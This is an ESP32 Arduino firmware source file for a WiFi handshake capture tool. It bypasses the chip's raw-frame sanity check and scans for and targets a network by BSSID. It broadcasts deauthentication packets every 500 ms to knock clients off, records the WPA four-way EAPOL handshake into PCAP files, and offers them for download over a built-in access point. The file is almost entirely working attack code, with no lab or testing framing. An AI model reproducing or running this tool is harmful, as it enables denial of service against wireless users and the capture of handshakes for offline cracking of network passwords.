#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <SPIFFS.h>
#include <WebServer.h>

// Bypass ESP32 frame sanity check
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// PCAP structures
typedef struct {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} __attribute__((packed)) pcap_global_header_t;

typedef struct {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} __attribute__((packed)) pcap_record_header_t;

// Network structure
typedef struct {
  String ssid;
  uint8_t bssid[6];
  int ch;
  int rssi;
  String encryption;
} Network;

// Global variables
Network networks[20];
Network target;
uint8_t* pcap_buffer = nullptr;
size_t pcap_size = 0;
bool handshake_captured = false;
bool beacon_captured = false;
uint8_t eapol_count = 0;
bool with_deauth = false;
bool is_capturing = false;

WebServer server(80);
const char* ap_ssid = "HandshakeCapture";
const char* ap_password = "capture123";

void scanNetworks();
void listNetworks();
void selectTarget();
void startCapture(bool deauth);
void stopCapture();
void saveHandshake();
void promiscuousRxCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void pcapInit();
void pcapAppend(const uint8_t* frame, size_t len);
void sendDeauth();
void startWebServer();
void handleRoot();
void handleDownload();
void handleListFiles();
void printHelp();

void setup() {
  Serial.begin(115200);
  
  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("Failed to mount SPIFFS");
    while(1) delay(1000);
  }

  // Start WiFi in AP mode
  WiFi.softAP(ap_ssid, ap_password);
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());

  // Set WiFi mode and enable promiscuous mode
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuousRxCallback);
  
  // Start web server
  startWebServer();
  
  Serial.println("\nWiFi Handshake Capture Tool");
  Serial.println("--------------------------");
  printHelp();
}

void loop() {
  server.handleClient();
  
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    
    if (input == "1") {
      scanNetworks();
    } 
    else if (input == "2") {
      listNetworks();
    } 
    else if (input == "3") {
      selectTarget();
    } 
    else if (input == "4") {
      startCapture(true);
    } 
    else if (input == "5") {
      startCapture(false);
    } 
    else if (input == "6") {
      stopCapture();
    } 
    else if (input == "7") {
      handleListFiles();
    } 
    else if (input == "8") {
      printHelp();
    } 
    else if (input == "9") {
      Serial.println("Restarting...");
      ESP.restart();
    } 
    else {
      Serial.println("Invalid command. Type '8' for help.");
    }
  }

  // Send deauth periodically if enabled and capturing
  static unsigned long last_deauth = 0;
  if (is_capturing && with_deauth && millis() - last_deauth > 500) {
    sendDeauth();
    last_deauth = millis();
  }
}

void printHelp() {
  Serial.println("\nCommands:");
  Serial.println("1 - Scan networks");
  Serial.println("2 - List scanned networks");
  Serial.println("3 - Select target by ID");
  Serial.println("4 - Start capture with deauth");
  Serial.println("5 - Start capture without deauth");
  Serial.println("6 - Stop capture");
  Serial.println("7 - List captured files");
  Serial.println("8 - Show this help");
  Serial.println("9 - Restart device");
  Serial.println("\nWeb Interface:");
  Serial.print("http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/list");
}

void scanNetworks() {
  Serial.println("\nScanning networks...");
  WiFi.scanDelete();
  
  // Perform the scan using the same method as network_scan.cpp
  int n = WiFi.scanNetworks(false, true); // Async scan, hidden networks
  
  if (n == 0) {
    Serial.println("No networks found");
    return;
  }

  // Clear previous scan results
  memset(networks, 0, sizeof(networks));

  for (int i = 0; i < min(n, 20); i++) {
    String ssid = WiFi.SSID(i);
    
    // Handle hidden networks
    if (ssid.isEmpty()) {
      networks[i].ssid = "<HIDDEN>";
    } else {
      networks[i].ssid = ssid;
    }
    
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    
    // Add encryption type information
    wifi_auth_mode_t encryption = WiFi.encryptionType(i);
    if (encryption == WIFI_AUTH_OPEN) networks[i].encryption = "Open";
    else if (encryption == WIFI_AUTH_WEP) networks[i].encryption = "WEP";
    else if (encryption == WIFI_AUTH_WPA_PSK) networks[i].encryption = "WPA";
    else if (encryption == WIFI_AUTH_WPA2_PSK) networks[i].encryption = "WPA2";
    else if (encryption == WIFI_AUTH_WPA_WPA2_PSK) networks[i].encryption = "WPA/WPA2";
    else if (encryption == WIFI_AUTH_WPA2_ENTERPRISE) networks[i].encryption = "WPA2 Enterprise";
    else networks[i].encryption = "Unknown";
  }
  
  Serial.printf("Found %d networks\n", n);
}

void listNetworks() {
  Serial.println("\nScanned Networks:");
  Serial.println("ID | SSID             | BSSID           | CH | RSSI  | Encryption");
  Serial.println("---------------------------------------------------------------");
  
  for (int i = 0; i < 20; i++) {
    if (networks[i].ssid == "") continue;
    
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             networks[i].bssid[0], networks[i].bssid[1], networks[i].bssid[2],
             networks[i].bssid[3], networks[i].bssid[4], networks[i].bssid[5]);
    
    Serial.printf("%2d | %-16s | %s | %2d | %5d | %s\n", 
                 i, networks[i].ssid.c_str(), bssidStr, 
                 networks[i].ch, networks[i].rssi, networks[i].encryption.c_str());
  }
}

void selectTarget() {
  listNetworks();
  Serial.print("\nEnter network ID to target: ");
  
  while (!Serial.available()) delay(100);
  int id = Serial.parseInt();
  
  if (id >= 0 && id < 20 && networks[id].ssid != "") {
    target = networks[id];
    Serial.printf("\nSelected target: %s (%02X:%02X:%02X:%02X:%02X:%02X) on channel %d\n",
                 target.ssid.c_str(), target.bssid[0], target.bssid[1], 
                 target.bssid[2], target.bssid[3], target.bssid[4], 
                 target.bssid[5], target.ch);
  } else {
    Serial.println("Invalid selection");
  }
}

void startCapture(bool deauth) {
  if (target.ssid == "") {
    Serial.println("No target selected");
    return;
  }

  if (is_capturing) {
    Serial.println("Already capturing. Stop first.");
    return;
  }

  Serial.printf("\nStarting handshake capture for %s...\n", target.ssid.c_str());
  Serial.println(deauth ? "With deauthentication" : "Without deauthentication");
  
  pcapInit();
  handshake_captured = false;
  beacon_captured = false;
  eapol_count = 0;
  with_deauth = deauth;
  is_capturing = true;
  
  // Set to target channel
  esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
}

void stopCapture() {
  if (!is_capturing) {
    Serial.println("Not currently capturing");
    return;
  }

  if (pcap_size > 0) {
    saveHandshake();
  } else {
    Serial.println("No handshake captured");
  }

  is_capturing = false;
}

void saveHandshake() {
  // Create filename with timestamp
  String timestamp = String(millis() / 1000);
  String filename = "/handshake_" + target.ssid + "_" + timestamp + ".pcap";
  filename.replace(" ", "_"); // Remove spaces from filename
  
  File file = SPIFFS.open(filename, FILE_WRITE);
  if (!file) {
    Serial.println("Failed to create file");
    return;
  }
  
  if (file.write(pcap_buffer, pcap_size) == pcap_size) {
    Serial.printf("Handshake saved to %s (%d bytes)\n", filename.c_str(), pcap_size);
  } else {
    Serial.println("Error writing file");
  }
  
  file.close();
  
  // Clean up
  free(pcap_buffer);
  pcap_buffer = nullptr;
  pcap_size = 0;
}

void promiscuousRxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!is_capturing) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 36) return;

  uint8_t frame_type = payload[0];
  bool is_beacon = frame_type == 0x80;

  // Capture beacon frame
  if (is_beacon && !beacon_captured && memcmp(&payload[10], target.bssid, 6) == 0) {
    Serial.println("Captured beacon frame");
    beacon_captured = true;
    pcapAppend(payload, len);
    return;
  }

  // Capture EAPOL frames (handshake)
  if ((frame_type == 0x08 || frame_type == 0x88) &&
     (memcmp(&payload[10], target.bssid, 6) == 0 || memcmp(&payload[4], target.bssid, 6) == 0)) {
    
    uint16_t ethertype = (payload[32] << 8) | payload[33];
    if (ethertype == 0x888E) { // EAPOL
      eapol_count++;
      Serial.printf("Captured EAPOL frame %d/4\n", eapol_count);
      pcapAppend(payload, len);

      if (eapol_count >= 4) {
        handshake_captured = true;
        Serial.println("Complete handshake captured!");
        stopCapture();
      }
    }
  }
}

void pcapInit() {
  free(pcap_buffer);
  pcap_size = sizeof(pcap_global_header_t);
  pcap_buffer = (uint8_t*)malloc(pcap_size);

  pcap_global_header_t header = {
    .magic_number = 0xa1b2c3d4,
    .version_major = 2,
    .version_minor = 4,
    .thiszone = 0,
    .sigfigs = 0,
    .snaplen = 65535,
    .network = 105 // LINKTYPE_IEEE802_11
  };
  memcpy(pcap_buffer, &header, sizeof(header));
}

void pcapAppend(const uint8_t* frame, size_t len) {
  if (!frame || len == 0) return;

  pcap_record_header_t rec = {
    .ts_sec = millis() / 1000,
    .ts_usec = (millis() % 1000) * 1000,
    .incl_len = len,
    .orig_len = len
  };

  uint8_t* new_buf = (uint8_t*)realloc(pcap_buffer, pcap_size + sizeof(rec) + len);
  if (!new_buf) return;

  memcpy(new_buf + pcap_size, &rec, sizeof(rec));
  memcpy(new_buf + pcap_size + sizeof(rec), frame, len);

  pcap_buffer = new_buf;
  pcap_size += sizeof(rec) + len;
}

void sendDeauth() {
  uint8_t deauth_packet[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };

  // Set BSSID in packet
  memcpy(&deauth_packet[10], target.bssid, 6);
  memcpy(&deauth_packet[16], target.bssid, 6);

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
  Serial.println("Sent deauth packet");
}

void startWebServer() {
  server.on("/", handleRoot);
  server.on("/download", handleDownload);
  server.on("/list", handleListFiles);
  server.begin();
}

void handleRoot() {
  server.send(200, "text/html", 
    "<h1>WiFi Handshake Capture Tool</h1>"
    "<p><a href='/list'>View captured handshakes</a></p>"
    "<p>Serial commands:</p>"
    "<pre>1 - Scan networks\n2 - List networks\n3 - Select target\n4 - Capture with deauth\n5 - Capture without deauth\n6 - Stop capture\n7 - List files\n8 - Help\n9 - Restart</pre>");
}

void handleListFiles() {
  String html = "<h1>Captured Handshakes</h1><ul>";
  
  File root = SPIFFS.open("/");
  File file = root.openNextFile();
  
  while(file) {
    if(String(file.name()).endsWith(".pcap")) {
      html += "<li><a href='/download?file=" + String(file.name()) + "'>" + String(file.name()) + "</a> (" + String(file.size()) + " bytes)</li>";
    }
    file = root.openNextFile();
  }
  
  html += "</ul>";
  server.send(200, "text/html", html);
}

void handleDownload() {
  if(!server.hasArg("file")) {
    server.send(400, "text/plain", "Missing file parameter");
    return;
  }
  
  String filename = server.arg("file");
  if(!SPIFFS.exists(filename)) {
    server.send(404, "text/plain", "File not found");
    return;
  }
  
  File file = SPIFFS.open(filename, "r");
  if(!file) {
    server.send(500, "text/plain", "Failed to open file");
    return;
  }
  
  server.sendHeader("Content-Type", "application/octet-stream");
  server.sendHeader("Content-Disposition", "attachment; filename=" + filename.substring(filename.lastIndexOf('/')+1));
  server.streamFile(file, "application/octet-stream");
  file.close();
}
